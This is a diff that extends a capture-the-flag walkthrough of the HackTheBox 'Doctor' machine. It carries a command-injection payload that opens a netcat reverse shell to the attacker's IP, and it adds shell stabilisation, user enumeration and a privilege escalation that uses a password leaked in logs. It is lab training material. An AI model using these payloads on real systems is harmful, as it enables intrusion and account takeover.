@@ -144,5 +144,78 @@ Next, we will try to do a code injection by modifying the payload to ```<!DOCTYP
 ### Obtaining reverse shell
 
 To obtain a reverse shell, we can modify the payload to ```<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.16.5:4000/$(nc.traditional$IFS-c$IFS/bin/bash$IFS'10.10.16.5'$IFS'3000')"> ]>```
+
+After obtaining the reverse shell, we will have to stabilize the shell
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 3000       
+listening on [any] 3000 ...
+connect to [10.10.16.5] from (UNKNOWN) [10.10.10.209] 42332
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+web@doctor:~$ export TERM=xterm
+export TERM=xterm
+web@doctor:~$ stty cols 132 rows 34
+stty cols 132 rows 34
+web@doctor:~$ 
+```
+
+### Privilege Escalation to shaun
+
+From the terminal, we are able to find that there are 2 users on this terminal, namely web and shaun. We are also able to know that the user flag lies in the user, Shaun. However, the current user does not have the privilege to read the user flag.
+
+```
+web@doctor:~/blog/flaskblog/users$ cd /home
+cd /home
+web@doctor:/home$ ls
+ls
+shaun  web
+web@doctor:/home$ ls shaun
+ls shaun
+user.txt
+web@doctor:/home$ cat shaun/user.txt
+cat shaun/user.txt
+cat: shaun/user.txt: Permission denied
+web@doctor:/home$ 
+```
+
+From Linpeas, we are able to discover that we can access the log files, and the log files are exposing a possible password.
+
+```
+10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"  
+```
+
+Afterwards, we will su into the Shaun with the password, Guitar123
+
+```
+web@doctor:/home$ su shaun
+su shaun
+Password: Guitar123
+
+shaun@doctor:/home$
+```
+
 ### Obtaining user flag
+
+```
+shaun@doctor:/home$ cat /home/shaun/user.txt
+cat /home/shaun/user.txt
+<Redacted user flag>
+```
 ### Obtaining root flag
+
+## Post-Exploitation
+### SSTI
+
+From the reverse shell output,  we realize that this website is running on Flask framework
+
+```
+web@doctor:~$ ls
+ls
+blog  blog.sh
+web@doctor:~$ cd blog
+cd blog
+web@doctor:~/blog$ ls
+ls
+flaskblog  run.py
+```
